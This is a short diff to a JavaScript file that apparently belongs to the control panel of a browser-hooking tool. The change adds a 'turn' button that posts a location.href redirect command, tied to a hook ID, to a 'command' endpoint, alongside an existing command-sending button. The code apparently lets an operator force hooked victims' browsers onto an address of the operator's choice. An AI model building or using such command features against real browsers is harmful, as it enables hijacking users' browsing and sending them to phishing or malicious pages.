@@ -208,6 +208,7 @@ $(document).ready(function(){
 	});	
 }
 
+
 $(document).ready(function(){
 	$("button#cmd_button").click(function(){
 		var cmd_id = $('#hook_id').text();
@@ -220,7 +221,23 @@ $(document).ready(function(){
 
 		});
 	});
+
+	$("button#turn").click(function(){
+		var cmd_id = $('#hook_id').text();
+		var turn_addr = $('#turn_addr').val();
+		console.log(turn_addr);
+		turn_cmd = "location.href='"+turn_addr+"';";
+		$.ajax({
+			url:'command',
+			method:"POST",
+			data:{"cmd":turn_cmd,"cmd_id":cmd_id},
+
+		});
+	});
+
 });
+
+
 
 
 
